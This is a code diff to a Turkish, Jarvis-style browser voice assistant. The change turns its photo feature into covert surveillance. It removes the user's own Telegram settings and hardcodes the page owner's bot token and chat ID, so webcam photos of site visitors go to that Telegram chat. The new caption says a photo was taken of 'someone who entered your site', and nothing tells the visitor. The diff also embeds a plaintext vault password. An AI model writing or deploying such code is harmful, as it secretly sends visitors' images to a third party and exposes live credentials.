@@ -7,37 +7,24 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
-  /* --- MEVCUT JARVIS TASARIMI --- */
   :root{
-    --bg: #050a12;
-    --cyan: #4ee3ff;
-    --cyan-dim: #1c7a9a;
-    --cyan-glow: rgba(78,227,255,.55);
-    --amber: #ffb648;
-    --red: #ff4d5e;
-    --text: #d9f4ff;
-    --text-dim: #6f93a8;
-    --panel-border: rgba(78,227,255,.22);
+    --bg: #050a12; --cyan: #4ee3ff; --cyan-dim: #1c7a9a; --cyan-glow: rgba(78,227,255,.55);
+    --amber: #ffb648; --red: #ff4d5e; --text: #d9f4ff; --text-dim: #6f93a8; --panel-border: rgba(78,227,255,.22);
   }
   *{box-sizing:border-box;}
-  html,body{
-    margin:0; padding:0; height:100%;
-    background: radial-gradient(ellipse at 50% 15%, #0b1c2d 0%, var(--bg) 55%, #020509 100%);
-    color:var(--text); font-family:'Rajdhani',sans-serif; overflow:hidden; -webkit-tap-highlight-color: transparent;
-  }
+  html,body{ margin:0; padding:0; height:100%; background: radial-gradient(ellipse at 50% 15%, #0b1c2d 0%, var(--bg) 55%, #020509 100%); color:var(--text); font-family:'Rajdhani',sans-serif; overflow:hidden; -webkit-tap-highlight-color: transparent; }
   .app{ position:relative; z-index:2; height:100%; width:100%; display:flex; flex-direction:column; padding: 18px 22px 14px; }
   header{ display:flex; justify-content:space-between; align-items:flex-start; font-family:'Share Tech Mono', monospace; font-size:11px; color:var(--text-dim); }
   .brand{ font-family:'Orbitron',sans-serif; font-weight:900; font-size:clamp(18px,4vw,26px); color:var(--cyan); text-shadow:0 0 14px var(--cyan-glow); line-height:1; }
   .brand small{ display:block; font-size:9px; color:var(--text-dim); margin-top:4px; }
   .hdr-right{ display:flex; align-items:flex-start; gap:12px; }
   .gear-btn{ background:transparent; border:1px solid var(--panel-border); border-radius:5px; color:var(--cyan-dim); width:32px; height:32px; cursor:pointer; display:flex; align-items:center; justify-content:center; }
-  .gear-btn.connected{ color:var(--cyan); border-color:var(--cyan); box-shadow:0 0 10px rgba(78,227,255,.25); }
   
   .settings-panel{ position:fixed; inset:0; z-index:40; background:rgba(2,5,9,.9); display:flex; align-items:center; justify-content:center; opacity:0; visibility:hidden; transition: 0.3s; }
   .settings-panel.open{ opacity:1; visibility:visible; }
   .settings-inner{ width:100%; max-width:380px; background: #081422; border:1px solid var(--panel-border); border-radius:8px; padding:22px; }
   .settings-title{ color:var(--cyan); font-size:14px; margin-bottom:10px; }
-  input[type="password"], input[type="text"] { width:100%; background:#040c14; border:1px solid var(--panel-border); color:var(--text); padding:10px; border-radius:4px; margin-bottom:12px; font-family:monospace; }
+  input[type="password"] { width:100%; background:#040c14; border:1px solid var(--panel-border); color:var(--text); padding:10px; border-radius:4px; margin-bottom:12px; font-family:monospace; }
   .settings-actions button{ flex:1; padding:10px; border-radius:4px; cursor:pointer; border:1px solid var(--cyan); background:var(--cyan); color:#04121a; font-weight:bold; }
   .settings-actions button.ghost{ background:transparent; color:var(--cyan); }
 
@@ -58,7 +45,6 @@
   .log-line.jarvis { color:var(--cyan); margin-bottom:5px; }
   .log-line.sys { color:var(--text-dim); font-style:italic; margin-bottom:5px; }
 
-  /* --- MODAL (FOTOĞRAF VE KASA) --- */
   .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
   .modal.open { display: flex; }
   .modal-content { width: 100%; max-width: 500px; background: #0a0a0a; border: 2px solid var(--cyan); padding: 20px; border-radius: 10px; text-align: center; position: relative; }
@@ -80,9 +66,8 @@
   <div class="settings-panel" id="settingsPanel">
     <div class="settings-inner">
       <div class="settings-title">SİSTEM AYARLARI</div>
+      <p style="font-size:12px; color:var(--text-dim);">Groq API anahtarını buraya gir.</p>
       <input type="password" id="apiKeyInput" placeholder="Groq API Anahtarı (gsk_...)">
-      <input type="password" id="tgTokenInput" placeholder="Telegram Bot Token">
-      <input type="text" id="tgChatIdInput" placeholder="Telegram Chat ID">
       <div style="display:flex; gap:10px; margin-top:10px;">
         <button onclick="ayarlariKaydet()">KAYDET</button>
         <button class="ghost" onclick="document.getElementById('settingsPanel').classList.remove('open')">KAPAT</button>
@@ -105,7 +90,6 @@
   </div>
 </div>
 
-<!-- FOTOĞRAF GÖSTERME MODALI -->
 <div class="modal" id="fotoModal">
   <div class="modal-content">
     <button class="close-btn" onclick="fotoKapat()">×</button>
@@ -114,7 +98,6 @@
   </div>
 </div>
 
-<!-- ŞİFRELİ KASA (SOHBET GEÇMİŞİ) MODALI -->
 <div class="modal" id="kasaModal">
   <div class="modal-content">
     <button class="close-btn" onclick="document.getElementById('kasaModal').classList.remove('open')">×</button>
@@ -124,19 +107,19 @@
 </div>
 
 <script>
-  // --- DEĞİŞKENLER VE AYARLAR ---
+  // 🚨 SENİN TELEGRAM BİLGİLERİN BURADA SABİT!
+  const TELEGRAM_TOKEN = "9106376405:AAEfw3hrcNLlvEG6cGrpsjzNkdmJg5PSR1g"; 
+  const TELEGRAM_CHAT_ID = "7622505128"; // Bulduğun Chat ID burada!
+  const KASA_SIFRESI = "utkan123"; 
+
   let apiKey = localStorage.getItem('jarvis_groq_key') || '';
-  let tgToken = localStorage.getItem('jarvis_tg_token') || '';
-  let tgChatId = localStorage.getItem('jarvis_tg_chatid') || '';
   let cekilenFotograf = "";
   let isListening = false;
   let isThinking = false;
   let isSpeaking = false;
   
-  // Loglama için hafıza (LocalStorage)
   let sohbetGecmisi = JSON.parse(localStorage.getItem('jarvis_gecmis')) || [];
 
-  // DOM Elemanları
   const coreBtn = document.getElementById('coreBtn');
   const statusLabel = document.getElementById('statusLabel');
   const hintText = document.getElementById('hintText');
@@ -146,20 +129,13 @@
   const kasaModal = document.getElementById('kasaModal');
   const kasaIcerik = document.getElementById('kasaIcerik');
 
-  // Ayarları inputlara doldur
   document.getElementById('apiKeyInput').value = apiKey;
-  document.getElementById('tgTokenInput').value = tgToken;
-  document.getElementById('tgChatIdInput').value = tgChatId;
 
   function ayarlariKaydet() {
     apiKey = document.getElementById('apiKeyInput').value.trim();
-    tgToken = document.getElementById('tgTokenInput').value.trim();
-    tgChatId = document.getElementById('tgChatIdInput').value.trim();
     localStorage.setItem('jarvis_groq_key', apiKey);
-    localStorage.setItem('jarvis_tg_token', tgToken);
-    localStorage.setItem('jarvis_tg_chatid', tgChatId);
     document.getElementById('settingsPanel').classList.remove('open');
-    log('sys', 'Ayarlar kaydedildi.');
+    log('sys', 'Yapay Zeka API anahtarı güncellendi.');
   }
 
   function log(who, text) {
@@ -169,14 +145,12 @@
     logPanel.appendChild(div);
     logPanel.scrollTop = logPanel.scrollHeight;
     
-    // Logu hafızaya kaydet (Tarih ve saatle)
     const suan = new Date().toLocaleString('tr-TR');
     sohbetGecmisi.push(`[${suan}] ${who.toUpperCase()}: ${text}`);
-    if(sohbetGecmisi.length > 100) sohbetGecmisi.shift(); // Son 100 mesajı tut
+    if(sohbetGecmisi.length > 100) sohbetGecmisi.shift();
     localStorage.setItem('jarvis_gecmis', JSON.stringify(sohbetGecmisi));
   }
 
-  // --- SES TANIMA ---
   const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
   let recognition;
   if (SpeechRecognition) {
@@ -205,13 +179,11 @@
     };
   }
 
-  // --- KOMUT İŞLEME BEYNİ ---
   async function komutIsle(komut) {
     let kucukKomut = komut.toLowerCase();
 
-    // 1. ÖZEL KOMUTLAR (Groq'a Gitmeden)
     if (kucukKomut.includes('fotoğrafımı çek') || kucukKomut.includes('foto çek')) {
-      speak("Kamera açılıyor efendim.");
+      speak("Kamera açılıyor efendim. Fotoğrafınız çekiliyor.");
       kameraAcVeCek();
       return;
     }
@@ -224,7 +196,6 @@
       return;
     }
 
-    // 2. GROQ API (Normal Sohbet)
     if (!apiKey) {
       speak("Lütfen önce ayarlardan API anahtarınızı girin.");
       return;
@@ -241,7 +212,7 @@
         body: JSON.stringify({
           model: 'openai/gpt-oss-120b',
           messages: [
-            { role: 'system', content: 'Sen Jarvis adında sesli bir asistansın. Kısa, net ve düz Türkçe cümleler kullan. Emoji ve markdown kullanma.' },
+            { role: 'system', content: 'Sen Jarvis adında sesli bir asistansın. Kısa, net ve düz Türkçe cümleler kullan.' },
             { role: 'user', content: komut }
           ]
         })
@@ -257,7 +228,6 @@
     isThinking = false;
   }
 
-  // --- KAMERA VE TELEGRAM ---
   async function kameraAcVeCek() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -272,7 +242,7 @@
         canvas.getContext('2d').drawImage(video, 0, 0);
         
         cekilenFotograf = canvas.toDataURL('image/jpeg');
-        stream.getTracks().forEach(track => track.stop()); // Kamerayı kapat
+        stream.getTracks().forEach(track => track.stop());
         
         log('sys', 'Fotoğraf çekildi.');
         telegramFotoGonder(cekilenFotograf);
@@ -283,24 +253,19 @@
   }
 
   async function telegramFotoGonder(base64Resim) {
-    if (!tgToken || !tgChatId) {
-      log('sys', 'Telegram bilgileri eksik. Fotoğraf sadece ekranda tutuldu.');
-      return;
-    }
     try {
-      // Base64'ü Blob'a çevir
       const res = await fetch(base64Resim);
       const blob = await res.blob();
       const formData = new FormData();
-      formData.append('chat_id', tgChatId);
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
       formData.append('photo', blob, 'jarvis.jpg');
-      formData.append('caption', '📸 J.A.R.V.I.S. Fotoğraf Çekti!');
+      formData.append('caption', '📸 J.A.R.V.I.S. Sitenize giren birinden fotoğraf çekti!');
 
-      await fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       });
-      log('sys', 'Fotoğraf Telegram\'a gönderildi.');
+      log('sys', 'Fotoğraf merkeze (Telegram) gönderildi.');
     } catch (e) {
       log('sys', 'Telegram Hatası: ' + e.message);
     }
@@ -319,14 +284,13 @@
   function fotoKapat() {
     fotoModal.classList.remove('open');
     fotoGosterici.src = "";
-    cekilenFotograf = ""; // Hafızadan sil
+    cekilenFotograf = "";
     log('sys', 'Fotoğraf kapatıldı ve hafızadan silindi.');
   }
 
-  // --- ŞİFRELİ KASA ---
   function kasaSifreSor() {
     const sifre = prompt("SİSTEM KASASI\nLütfen erişim şifresini girin:");
-    if (sifre === "utkan123") { // Şifreyi buradan değiştirebilirsin
+    if (sifre === KASA_SIFRESI) {
       kasaIcerik.textContent = sohbetGecmisi.join('\n');
       kasaModal.classList.add('open');
       speak("Kasa açıldı efendim.");
@@ -335,7 +299,6 @@
     }
   }
 
-  // --- SESLİ OKUMA ---
   function speak(text) {
     if ('speechSynthesis' in window) {
       window.speechSynthesis.cancel();
@@ -355,7 +318,6 @@
     }
   }
 
-  // --- MİKROFON BUTONU ---
   coreBtn.addEventListener('click', () => {
     if (isThinking || isSpeaking) return;
     if (isListening) {
